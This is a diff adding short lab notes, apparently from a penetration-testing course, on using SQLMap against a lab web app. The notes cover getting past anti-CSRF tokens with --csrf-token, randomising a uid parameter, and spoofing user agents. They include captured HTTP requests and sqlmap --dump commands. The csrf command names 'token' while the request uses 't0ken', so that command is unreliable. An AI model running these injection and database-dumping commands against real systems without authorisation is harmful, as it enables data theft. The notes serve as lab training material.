@@ -1,0 +1,68 @@
+CSRF-token
+
+One of the first hurdles you might face when using automation tools is the presence of anti-CSRF tokens. CSRF, or Cross-Site Request Forgery tokens, are included in HTTP requests to prevent unauthorized actions, especially those triggered by web forms.
+In simple terms, every HTTP request in such setups requires a valid token—one that is only available if the user has actually visited and interacted with the page. Originally, this mechanism was designed to prevent malicious scenarios, like a logged-in administrator accidentally opening a harmful link that could, for instance, create a new user with predefined credentials. While it’s an important security measure, it also unintentionally makes automated testing and enumeration more difficult.
+Fortunately, SQLMap offers a solution. The --csrf-token option allows you to specify the name of the token parameter, which is usually present in the request data. SQLMap then automatically parses the server’s responses to extract fresh token values and uses them in subsequent requests. This approach effectively allows automated tools to navigate through CSRF-protected forms without getting blocked.
+By leveraging these options, penetration testers can continue their work without being hindered by basic anti-CSRF protections, making the enumeration process much smoother and more efficient.
+
+Request.txt
+    POST /case8.php HTTP/1.1
+    Host: 94.237.62.175:46627
+    Content-Length: 54
+    Cache-Control: max-age=0
+    Accept-Language: en-US,en;q=0.9
+    Origin: http://94.237.62.175:46627
+    Content-Type: application/x-www-form-urlencoded
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Referer: http://94.237.62.175:46627/case8.php
+    Accept-Encoding: gzip, deflate, br
+    Cookie: PHPSESSID=67obd873rfkos1qkutarcraair
+    Connection: keep-alive
+    
+    id=1&t0ken=a5fSi4WDOhkxK9amkBcLQZTaLhQSShHC4w57cYWsndE
+
+
+sqlmap -r request.txt --csrf-token="token" --batch --dump
+
+
+
+
+
+========================================================================================================================================================
+========================================================================================================================================================
+========================================================================================================================================================
+
+uid
+
+sqlmap -r case9.txt --randomize=uid --batch --dump
+
+
+request.txt 
+    GET /case9.php?id=1&uid=85889111 HTTP/1.1
+    Host: 94.237.62.175:46627
+    Accept-Language: en-US,en;q=0.9
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Referer: http://94.237.62.175:46627/case9.php
+    Accept-Encoding: gzip, deflate, br
+    Cookie: PHPSESSID=67obd873rfkos1qkutarcraair
+    Connection: keep-alive
+
+
+========================================================================================================================================================
+========================================================================================================================================================
+========================================================================================================================================================
+
+ --random-agent
+
+
+
+========================================================================================================================================================
+========================================================================================================================================================
+========================================================================================================================================================
+
+
+
